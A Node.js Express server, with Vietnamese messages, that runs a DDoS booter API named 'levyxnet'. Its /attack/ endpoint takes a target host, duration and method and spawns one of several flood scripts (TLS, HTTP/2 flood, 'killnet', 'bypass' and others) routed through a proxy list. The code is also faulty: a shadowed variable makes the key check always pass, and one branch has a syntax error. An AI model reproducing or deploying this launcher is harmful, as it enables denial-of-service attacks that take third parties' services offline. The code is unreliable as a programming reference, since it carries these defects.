//METHODS 
//api cùng script lỏ
const express = require('express');
const app = express();
const port = 8080;

const key = "kidg";

app.get('/attack/', (req, res) => {
  try {
    const key = req.query.key;  
    const host = req.query.host;
    const port = req.query.port;
    const time = parseInt(req.query.time);
    const method = req.query.method;

    if (req.query.key !== key) {
      return res.status(401).send('Key not working');
    }

    if (method === 'tls') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['tls.js', host, time, 64, 7, 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>levyxnet api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Đã xảy ra lỗi trong quá trình thực hiện quy trình..');
          res.status(500).send('Đã xảy ra lỗi trong quá trình thực hiện quy trình..');
        }
      });
      } else if (method === 'bypass') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['by.js', host, time, 7, 'proxy.txt' 64 ]);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>levyxnet api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Đã xảy ra lỗi trong quá trình thực hiện quy trình..');
          res.status(500).send('Đã xảy ra lỗi trong quá trình thực hiện quy trình..');
        }
      });
      } else if (method === 'clgv') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['bypass.js', host, time, 64, 5, 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>levyxnet api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Đã xảy ra lỗi trong quá trình thực hiện quy trình..');
          res.status(500).send('Đã xảy ra lỗi trong quá trình thực hiện quy trình..');
        }
      });
      } else if (method === '404') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['dnk.js', host, time, 64, 7, 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>levyxnet api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Đã xảy ra lỗi trong quá trình thực hiện quy trình..');
          res.status(500).send('Đã xảy ra lỗi trong quá trình thực hiện quy trình..');
        }
      });
      } else if (method === 'kill') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['killnet.js', host, time, 5, 64, 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>levyxnet api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Đã xảy ra lỗi trong quá trình thực hiện quy trình..');
          res.status(500).send('Đã xảy ra lỗi trong quá trình thực hiện quy trình..');
        }
      });
      } else if (method === 'flood') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['h2floodv2.js', host, time, 64, 7, 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>levyxnet api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Đã xảy ra lỗi trong quá trình thực hiện quy trình..');
          res.status(500).send('Đã xảy ra lỗi trong quá trình thực hiện quy trình..');
        }
      });
      } else if (method === 'ox') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['sextoy.js', host, time, 64, 7, 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>levyxnet api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Đã xảy ra lỗi trong quá trình thực hiện quy trình..');
          res.status(500).send('Đã xảy ra lỗi trong quá trình thực hiện quy trình..');
        }
      });
      } else if (method === 're') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['w00t.js', host, time, 64, 5, 'GET', 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>levyxnet api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Đã xảy ra lỗi trong quá trình thực hiện quy trình..');
          res.status(500).send('Đã xảy ra lỗi trong quá trình thực hiện quy trình..');
        }
      });
      } else if (method === '1x') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['1xx.js', host, time, 64, 7, 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>levyxnet api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Đã xảy ra lỗi trong quá trình thực hiện quy trình..');
          res.status(500).send('Đã xảy ra lỗi trong quá trình thực hiện quy trình..');
        }
      });
    } else if (method === 'bp') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['pby.js', host, time, 64, 5, 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>levyxnet api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Đã xảy ra lỗi trong quá trình thực hiện quy trình..');
          res.status(500).send('Đã xảy ra lỗi trong quá trình thực hiện quy trình..');
        }
      });
    } else {
      console.error(' thiếu hay sai method kìa..');
      res.status(400).send('sai method kìa bạn ơi..');
    }
  } catch (error) {
    console.error(error);
    res.status(500).send('sai chỗ nào thế nhờ..');
  }
});

app.listen(port, () => {
  console.log(`API by ##### Started To: ${port} port`);
});
